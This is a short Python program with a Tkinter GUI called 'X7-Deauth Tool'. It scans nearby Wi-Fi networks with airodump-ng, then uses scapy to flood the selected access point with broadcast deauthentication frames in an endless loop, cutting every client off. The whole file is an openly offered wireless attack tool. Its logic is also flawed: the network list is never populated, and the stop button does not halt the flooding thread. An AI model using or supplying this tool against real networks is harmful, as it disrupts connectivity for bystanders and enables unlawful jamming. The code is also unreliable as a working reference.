#!/usr/bin/env python3
import tkinter as tk
from tkinter import messagebox
import os
import time
from scapy.all import *
from threading import Thread

iface = "wlan0mon"  # change if necessary

def scan_networks():
    os.system(f"airodump-ng {iface} -w scan_results --output-format csv &")
    time.sleep(10)
    os.system("pkill airodump-ng")

    networks = []
    with open("scan_results-01.csv", "r", encoding='ISO-8859-1') as file:
        for line in file:
            if "WPA" in line or "WEP" in line or "OPN" in line:
                parts = line.split(",")
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                networks.append((bssid, channel, essid))
    return networks

def deauth(bssid):
    pkt = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    while True:
        sendp(pkt, iface=iface, inter=0.1, count=100, verbose=False)

def start_attack():
    networks = scan_networks()
    if not networks:
        messagebox.showerror("Error", "No networks found.")
        return

    choice = int(network_listbox.curselection()[0])
    target_bssid = networks[choice][0]
    target_channel = networks[choice][1]

    os.system(f"iwconfig {iface} channel {target_channel}")
    time.sleep(2)

    messagebox.showinfo("Info", f"Jamming {target_bssid} on channel {target_channel}...")
    deauth_thread = Thread(target=deauth, args=(target_bssid,))
    deauth_thread.start()

def stop_attack():
    os.system("pkill airodump-ng")
    messagebox.showinfo("Info", "Attack stopped.")

app = tk.Tk()
app.title("X7-Deauth Tool")
app.geometry("400x300")

scan_button = tk.Button(app, text="Start Scan", command=start_attack)
scan_button.pack(pady=10)

stop_button = tk.Button(app, text="Stop Attack", command=stop_attack)
stop_button.pack(pady=10)

network_listbox = tk.Listbox(app, height=10, width=50)
network_listbox.pack(pady=10)

app.mainloop()
